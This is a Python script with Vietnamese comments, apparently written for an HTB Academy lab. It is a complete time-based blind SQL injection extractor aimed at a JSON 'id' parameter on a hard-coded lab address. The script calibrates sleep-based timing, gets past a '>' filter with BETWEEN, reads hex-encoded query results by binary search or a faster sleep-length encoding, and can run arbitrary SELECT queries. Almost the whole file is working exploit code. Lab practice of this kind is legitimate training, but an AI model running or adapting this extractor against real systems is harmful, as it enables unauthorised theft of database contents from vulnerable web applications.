#!/usr/bin/env python3
"""
Time-based blind SQLi extractor  --  HTB Academy /action.php (JSON id, INSERT context)

Dac diem cua target:
  * boundary rong (numeric), payload dang (if(<cond>,sleep(N),1))
  * ky tu '>' bi filter  -> chi dung BETWEEN
  * response luon rong   -> oracle duy nhat la thoi gian
  * cau lenh goc la INSERT -> phai chay tuan tu (1 luong)

Mac dinh chay che do HEX: doc hex(content) thay vi doc truc tiep ky tu.
  - charset chi con [0-9A-F] -> 5 request/hex digit
  - phat hien chinh xac byte >127 (ky tu multibyte) - dieu ma sweep 32..126 khong the thay
  - moi ket qua deu la byte thuc, khong the "doan sai am tham"

Usage:
    python3 blind_extract.py                       # lay flag (che do hex)
    python3 blind_extract.py --mode char           # doc truc tiep tung ky tu
    python3 blind_extract.py --query "select database()"
    python3 blind_extract.py --selftest            # kiem tra logic, khong gui request
"""

import argparse
import json
import statistics
import sys
import time

import requests

# ----------------------------------------------------------------------------- config
URL = "http://154.57.164.77:30892/action.php"

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"),
    "Accept": "*/*",
    "Connection": "close",          # tranh Keep-Alive: timeout=5 trung voi sleep
}

DEFAULT_QUERY = "select content from final_flag limit 1"

# ----------------------------------------------------------------------------- oracle
class Oracle:
    """Gui payload va tra ve True/False dua tren do tre."""

    def __init__(self, url, delay=1.0, votes=1, retries=4, pause=0.0, verbose=False):
        self.url = url
        self.delay = delay
        self.votes = votes          # so lan bo phieu cho moi cau hoi
        self.retries = retries
        self.pause = pause
        self.verbose = verbose
        self.step = 0.15
        self.threshold = delay * 0.6
        self.baseline = 0.0
        self.n_req = 0
        self.sess = requests.Session()

    # -- tang van chuyen ----------------------------------------------------
    def _send(self, cond):
        return self._send_raw(f"(if({cond},sleep({self.delay}),1))")

    def _send_raw(self, payload):
        last = None
        for attempt in range(self.retries):
            try:
                t0 = time.time()
                self.sess.post(self.url, headers=HEADERS,
                               data=json.dumps({"id": payload}),
                               timeout=self.delay + 25)
                dt = time.time() - t0
                self.n_req += 1
                if self.pause:
                    time.sleep(self.pause)
                return dt
            except requests.RequestException as e:
                last = e
                time.sleep(2 * (attempt + 1))
        raise RuntimeError(f"request that bai sau {self.retries} lan: {last}")

    # -- hieu chuan ---------------------------------------------------------
    def calibrate(self, n=6):
        """Do do tre nen va kiem tra sleep co that su hoat dong."""
        fast = [self._send("0") for _ in range(n)]
        self.baseline = statistics.median(fast)
        jitter = statistics.pstdev(fast) if len(fast) > 1 else 0.0

        slow = self._send("1")

        print(f"[cal] baseline  : {self.baseline:.2f}s  (jitter {jitter:.2f}s, "
              f"min {min(fast):.2f} max {max(fast):.2f})")
        print(f"[cal] voi sleep : {slow:.2f}s")

        if slow < self.baseline + self.delay * 0.5:
            sys.exit("[!] sleep() KHONG tao ra do tre -> oracle chet.\n"
                     "    Kiem tra: URL con song? UA co bi filter? "
                     "payload co bi chan (response 'Hacker!!!')?")

        # nguong dat giua baseline+jitter va baseline+delay
        self.threshold = self.baseline + max(self.delay * 0.45, jitter * 4)
        if self.threshold >= self.baseline + self.delay * 0.9:
            print(f"[!] jitter qua lon so voi --delay={self.delay}. "
                  f"Nen tang --delay.")
        print(f"[cal] nguong    : {self.threshold:.2f}s\n")

    # -- tang logic ---------------------------------------------------------
    def ask(self, cond):
        """True neu dieu kien SQL dung. Bo phieu da so khi votes>1."""
        hits = 0
        for i in range(self.votes):
            dt = self._send(cond)
            hits += dt > self.threshold
            # dong thuan som: 2 phieu giong nhau trong 3 -> khoi hoi tiep
            if self.votes == 3 and i == 1 and hits in (0, 2):
                break
        n = i + 1
        res = hits * 2 > n
        if self.verbose:
            print(f"      {cond[:70]:<70} -> {res}")
        return res


# ----------------------------------------------------------------------------- search
def bsearch(oracle, expr, lo, hi):
    """Tim gia tri cua <expr> trong [lo,hi] chi bang BETWEEN."""
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.ask(f"{expr} between {lo} and {mid}"):
            hi = mid
        else:
            lo = mid + 1
    return lo


def get_number(oracle, expr, hi=4096):
    """Doc mot so nguyen, tu noi rong khoang tren neu can."""
    while not oracle.ask(f"{expr} between 0 and {hi}"):
        hi *= 2
        if hi > 2 ** 24:
            raise RuntimeError(f"{expr} vuot qua 2^24 - co le subquery tra NULL")
    return bsearch(oracle, expr, 0, hi)


def extract(oracle, query, mode="hex", maxlen=None):
    """Trich xuat gia tri cua <query>. Tra ve (raw_bytes, meta dict)."""
    meta = {}

    # 1) subquery co du lieu khong?  NULL se lam moi dieu kien thanh NULL(=false)
    if not oracle.ask(f"({query}) is not null"):
        raise RuntimeError("subquery tra NULL hoac khong co row nao. "
                           "Kiem tra ten bang/cot va quyen truy cap.")

    # 2) do dai theo byte va theo ky tu -> phat hien multibyte
    blen = get_number(oracle, f"length(({query}))")
    clen = get_number(oracle, f"char_length(({query}))")
    meta["byte_len"] = blen
    meta["char_len"] = clen
    print(f"[len] length()      = {blen} byte")
    print(f"[len] char_length() = {clen} ky tu"
          + ("   <-- KHAC NHAU: co ky tu multibyte" if blen != clen else "")
          + "\n")

    if mode == "turbo":
        data = turbo_hex(oracle, query, blen, oracle.step)
        print("[chk] dang xac minh bang 1 request...", end=" ", flush=True)
        if verify(oracle, query, data):
            print("KHOP")
        else:
            print("KHONG KHOP -> chuyen sang binary search (chinh xac hon)")
            return extract(oracle, query, "hex", maxlen)[0], meta
        return data, meta

    if mode == "hex":
        # hex(x) dai gap doi so byte, charset chi [0-9A-F]
        n = blen * 2
        if maxlen:
            n = min(n, maxlen * 2)
        src = f"hex(({query}))"
        digits = ""
        for i in range(1, n + 1):
            expr = f"ord(substr({src},{i},1))"
            # '0'-'9' = 48-57 , 'A'-'F' = 65-70
            if oracle.ask(f"{expr} between 48 and 57"):
                code = bsearch(oracle, expr, 48, 57)
            else:
                code = bsearch(oracle, expr, 65, 70)
            digits += chr(code)
            if i % 2 == 0:
                shown = bytes.fromhex(digits).decode("utf-8", "replace")
                print(f"\r[{i//2:>3}/{blen}] {shown}", end="", flush=True)
        print()
        return bytes.fromhex(digits), meta

    # mode == "char": doc truc tiep, 8 request/ky tu, khoang 0..255
    n = maxlen or clen
    out = bytearray()
    for i in range(1, n + 1):
        expr = f"ord(substr(({query}),{i},1))"
        code = bsearch(oracle, expr, 0, 255)
        if code == 0:
            break
        out.append(code)
        print(f"\r[{i:>3}/{n}] {out.decode('utf-8','replace')}", end="", flush=True)
    print()
    return bytes(out), meta




HEXSET = "0x30313233343536373839414243444546"      # '0123456789ABCDEF' dang hex literal


def turbo_hex(oracle, query, nbytes, step):
    """Doc hex(query) - MOT request cho moi hex digit.

    Gia tri 0..15 duoc ma hoa vao do dai sleep: dt - baseline ~ value * step.
    Nhanh gap ~5 lan binary search, nhung phai xac minh lai o cuoi.
    """
    digits = ""
    src = f"hex(({query}))"
    for i in range(1, nbytes * 2 + 1):
        expr = f"(instr({HEXSET},substr({src},{i},1))-1)"
        dt = oracle._send_raw(f"(select sleep({expr}*{step}))")
        val = round((dt - oracle.baseline) / step)
        val = min(max(val, 0), 15)
        digits += "0123456789ABCDEF"[val]
        if i % 2 == 0:
            shown = bytes.fromhex(digits).decode("utf-8", "replace")
            print(f"\r[{i//2:>3}/{nbytes}] {shown}", end="", flush=True)
    print()
    return bytes.fromhex(digits)


def verify(oracle, query, data):
    """Xac minh toan bo gia tri bang 1 request. Dung hex literal -> khong can dau nhay."""
    lit = "0x" + data.hex()
    return oracle.ask(f"({query}) between {lit} and {lit}")

# ----------------------------------------------------------------------------- selftest
def selftest():
    """Kiem tra logic tim kiem bang oracle gia - khong gui request nao."""
    import re

    SECRET = "HTB{n07_50_h4rd_r16h7?!}"          # 24 ky tu
    calls = {"n": 0}

    class Fake(Oracle):
        def __init__(self):
            self.votes = 1
            self.verbose = False

        def ask(self, cond):
            calls["n"] += 1
            m = re.match(r"^(.*) between (\d+) and (\d+)$", cond)
            if cond.endswith("is not null"):
                return True
            assert m, cond
            expr, lo, hi = m.group(1), int(m.group(2)), int(m.group(3))
            return lo <= self._eval(expr) <= hi

        def _eval(self, expr):
            if expr.startswith("length("):
                return len(SECRET.encode())
            if expr.startswith("char_length("):
                return len(SECRET)
            m = re.match(r"^ord\(substr\(hex\(\((.*)\)\),(\d+),1\)\)$", expr)
            if m:
                return ord(SECRET.encode().hex().upper()[int(m.group(2)) - 1])
            m = re.match(r"^ord\(substr\(\((.*)\),(\d+),1\)\)$", expr)
            if m:
                i = int(m.group(2))
                return SECRET.encode()[i - 1] if i <= len(SECRET) else 0
            raise AssertionError(expr)

    for mode in ("hex", "char"):
        calls["n"] = 0
        data, meta = extract(Fake(), "select content from final_flag limit 1", mode)
        got = data.decode()
        status = "OK " if got == SECRET else "FAIL"
        print(f"[{status}] mode={mode:<4} -> {got!r}  ({calls['n']} cau hoi)")
        assert got == SECRET, f"mode {mode}: {got!r} != {SECRET!r}"
    print("\nselftest: logic binary search + hex decode dung.")


# ----------------------------------------------------------------------------- main
def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=URL)
    p.add_argument("--query", default=DEFAULT_QUERY)
    p.add_argument("--mode", choices=("hex", "char", "turbo"), default="turbo")
    p.add_argument("--step", type=float, default=0.15,
                   help="turbo: giay cho moi bac gia tri (nen >= 10x jitter)")
    p.add_argument("--delay", type=float, default=1.0, help="tham so cho sleep() (co the la so thap phan)")
    p.add_argument("--votes", type=int, default=1, choices=(1, 3),
                   help="3 = bo phieu da so, dung khi mang nhieu")
    p.add_argument("--pause", type=float, default=0.0,
                   help="nghi giua cac request (chong connection reset)")
    p.add_argument("--maxlen", type=int, default=None)
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--selftest", action="store_true")
    a = p.parse_args()

    if a.selftest:
        selftest()
        return

    o = Oracle(a.url, delay=a.delay, votes=a.votes,
               pause=a.pause, verbose=a.verbose)
    o.step = a.step
    print(f"[*] target : {a.url}")
    print(f"[*] query  : {a.query}")
    print(f"[*] mode   : {a.mode}\n")

    o.calibrate()
    t0 = time.time()
    data, meta = extract(o, a.query, a.mode, a.maxlen)

    print()
    print("=" * 60)
    print("raw bytes :", data)
    print("hex       :", data.hex())
    print("utf-8     :", data.decode("utf-8", "replace"))
    print("do dai    :", len(data), "byte /", meta.get("char_len"), "ky tu")
    print(f"chi phi   : {o.n_req} request, {time.time()-t0:.0f}s")
    print("=" * 60)


if __name__ == "__main__":
    main()